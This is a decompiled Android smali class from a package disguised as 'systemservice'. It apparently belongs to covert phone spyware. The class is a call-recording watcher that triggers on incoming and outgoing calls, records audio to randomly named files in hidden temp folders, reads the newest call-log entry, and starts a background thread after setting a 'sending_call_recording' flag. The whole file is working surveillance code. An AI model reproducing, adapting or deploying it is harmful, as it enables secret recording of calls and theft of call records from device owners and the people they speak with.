.class public Lcom/systemservice/a/c/c/m;
.super Lcom/systemservice/a/d/a;
.source ""


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field private static final d:[Ljava/lang/String;


# instance fields
.field private e:Ljava/lang/String;

.field private f:Lorg/apache/log4j/Logger;

.field private g:Ljava/lang/String;

.field private h:Z

.field private i:Landroid/content/SharedPreferences;

.field private j:Landroid/os/Handler;

.field private k:Lcom/systemservice/a/a/g;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "android.intent.action.PHONE_STATE"

    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    filled-new-array {v0, v1}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/systemservice/a/c/c/m;->d:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/m;)V
    .locals 1

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const-string v0, "RecordCallWatcher"

    iput-object v0, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/a/c/c/m;->h:Z

    iput-object p2, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, p4}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/h/b;)V

    const-string p2, "AndroidRecordCallWatcher"

    invoke-static {p2}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object p2

    iput-object p2, p0, Lcom/systemservice/a/c/c/m;->f:Lorg/apache/log4j/Logger;

    iget-object p2, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    if-nez p2, :cond_0

    new-instance p2, Lcom/systemservice/a/a/g;

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object p4

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p4, "/call_recording.mp3"

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-direct {p2, p1, p3}, Lcom/systemservice/a/a/g;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    iput-object p2, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    :cond_0
    return-void
.end method

.method private a(Landroid/content/Context;)Lcom/systemservice/a/e/f;
    .locals 22

    move-object/from16 v1, p0

    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    sget-object v3, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const-string v7, "date DESC"

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    const-string v3, ""

    const/4 v4, 0x0

    if-eqz v2, :cond_6

    :try_start_0
    const-string v0, "name"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    const-string v5, "number"

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    const-string v6, "type"

    invoke-interface {v2, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    const-string v7, "date"

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    const-string v8, "duration"

    invoke-interface {v2, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v2}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v9

    if-eqz v9, :cond_4

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v9

    const-wide/16 v11, 0x3e8

    div-long v14, v9, v11

    invoke-interface {v2, v8}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v16

    invoke-interface {v2, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    const/4 v6, 0x0

    const/4 v7, 0x1

    const/4 v8, 0x2

    if-eq v5, v7, :cond_1

    if-eq v5, v8, :cond_0

    const/4 v7, 0x3

    if-eq v5, v7, :cond_1

    const/16 v21, 0x2

    goto :goto_0

    :cond_0
    const/16 v21, 0x1

    goto :goto_0

    :cond_1
    const/16 v21, 0x0

    :goto_0
    if-eqz v0, :cond_3

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v5

    if-nez v5, :cond_2

    goto :goto_1

    :cond_2
    move-object v12, v0

    goto :goto_2

    :cond_3
    :goto_1
    move-object v12, v13

    :goto_2
    new-instance v0, Lcom/systemservice/a/e/f;

    const-wide/16 v10, 0x0

    const-string v18, ""

    const-wide/16 v19, 0x0

    move-object v9, v0

    invoke-direct/range {v9 .. v21}, Lcom/systemservice/a/e/f;-><init>(JLjava/lang/String;Ljava/lang/String;JJLjava/lang/String;JI)V

    move-object v4, v0

    :cond_4
    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_6

    :catchall_0
    move-exception v0

    move-object v4, v0

    goto :goto_4

    :catch_0
    move-exception v0

    :try_start_1
    iget-object v5, v1, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v2, :cond_7

    :try_start_2
    invoke-interface {v2}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_7

    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_7

    :catch_1
    move-exception v0

    iget-object v2, v1, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    :goto_3
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_7

    :goto_4
    if-eqz v2, :cond_5

    :try_start_3
    invoke-interface {v2}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_5

    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_5

    :catch_2
    move-exception v0

    iget-object v2, v1, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_5
    :goto_5
    throw v4

    :cond_6
    :goto_6
    if-eqz v2, :cond_7

    :try_start_4
    invoke-interface {v2}, Landroid/database/Cursor;->isClosed()Z

    move-result v0

    if-nez v0, :cond_7

    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_7

    :catch_3
    move-exception v0

    iget-object v2, v1, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    goto :goto_3

    :cond_7
    :goto_7
    return-object v4
.end method

.method static synthetic a(Lcom/systemservice/a/c/c/m;Landroid/content/Context;)Lcom/systemservice/a/e/f;
    .locals 0

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/c/m;->a(Landroid/content/Context;)Lcom/systemservice/a/e/f;

    move-result-object p0

    return-object p0
.end method

.method static synthetic a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/m;->f:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method static synthetic b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic c(Lcom/systemservice/a/c/c/m;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/systemservice/a/c/c/m;->h:Z

    return p0
.end method

.method static synthetic d(Lcom/systemservice/a/c/c/m;)Lcom/systemservice/a/a/g;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    return-object p0
.end method

.method static synthetic e(Lcom/systemservice/a/c/c/m;)Landroid/content/SharedPreferences;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/c/m;->i:Landroid/content/SharedPreferences;

    return-object p0
.end method

.method private g()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    :try_start_0
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/systemservice/a/a/j;->l:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".temp/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".temp_file/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ".3gp"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    invoke-virtual {v1, v0}, Lcom/systemservice/a/a/g;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    invoke-virtual {v0}, Lcom/systemservice/a/a/g;->b()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method private h()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    invoke-virtual {v0}, Lcom/systemservice/a/a/g;->c()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    :goto_0
    return-void
.end method


# virtual methods
.method public a(Lcom/systemservice/a/b/a;)V
    .locals 6

    const-string v0, ""

    :try_start_0
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_0

    const-string v2, "android.permission.RECORD_AUDIO"

    invoke-static {v1, v2}, Landroid/support/v4/content/a;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    return-void

    :cond_0
    invoke-static {v1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_8

    iget-boolean v2, p0, Lcom/systemservice/a/c/c/m;->h:Z

    if-nez v2, :cond_1

    goto/16 :goto_2

    :cond_1
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->b()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_9

    const-string v3, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v4, "#"

    const-string v5, "*"

    if-eqz v3, :cond_4

    :try_start_1
    const-string v1, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    if-eqz p1, :cond_9

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    invoke-virtual {p1, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_3

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-eqz p1, :cond_2

    goto :goto_1

    :cond_2
    :try_start_2
    invoke-direct {p0}, Lcom/systemservice/a/c/c/m;->g()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_3

    :catch_0
    move-exception p1

    :try_start_3
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->f:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    :goto_0
    invoke-virtual {v1, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    goto/16 :goto_3

    :cond_3
    :goto_1
    return-void

    :cond_4
    const-string v3, "android.intent.action.PHONE_STATE"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_9

    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    const-string v3, "state"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Landroid/telephony/TelephonyManager;->EXTRA_STATE_RINGING:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    const-string v1, "incoming_number"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :try_start_4
    invoke-direct {p0}, Lcom/systemservice/a/c/c/m;->g()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_3

    :catch_1
    move-exception p1

    :try_start_5
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->f:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0

    :cond_5
    sget-object p1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_IDLE:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_9

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->k:Lcom/systemservice/a/a/g;

    if-nez p1, :cond_7

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    invoke-virtual {p1, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_6

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->g:Ljava/lang/String;

    invoke-virtual {p1, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_7

    :cond_6
    return-void

    :cond_7
    invoke-direct {p0}, Lcom/systemservice/a/c/c/m;->h()V

    iget-object p1, p0, Lcom/systemservice/a/c/c/m;->j:Landroid/os/Handler;

    new-instance v2, Lcom/systemservice/a/c/c/l;

    invoke-direct {v2, p0, v1}, Lcom/systemservice/a/c/c/l;-><init>(Lcom/systemservice/a/c/c/m;Landroid/content/Context;)V

    const-wide/16 v3, 0x3e8

    invoke-virtual {p1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_3

    :cond_8
    :goto_2
    return-void

    :catch_2
    move-exception p1

    iget-object v1, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_9
    :goto_3
    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 3

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    const-string v1, "--- start(RECORDCALL) ---"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/systemservice/a/c/c/m;->j:Landroid/os/Handler;

    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    const-string v0, "app_prefs_settings"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/systemservice/a/c/c/m;->i:Landroid/content/SharedPreferences;

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v0

    invoke-virtual {v0, p1}, Lcom/systemservice/common/features/settingHistory/b;->d(Landroid/content/Context;)V

    invoke-static {p1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->i:Landroid/content/SharedPreferences;

    const-string v2, "is_record_call_active"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lcom/systemservice/a/c/c/m;->h:Z

    iget-boolean v0, p0, Lcom/systemservice/a/c/c/m;->h:Z

    if-nez v0, :cond_1

    return-void

    :cond_1
    const-string v0, "sending_call_recording"

    invoke-static {p1, v0, v1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/c/j;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/c/j;-><init>(Lcom/systemservice/a/c/c/m;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->e:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/c/m;->f:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/a/c/c/m;->d:[Ljava/lang/String;

    return-object v0
.end method
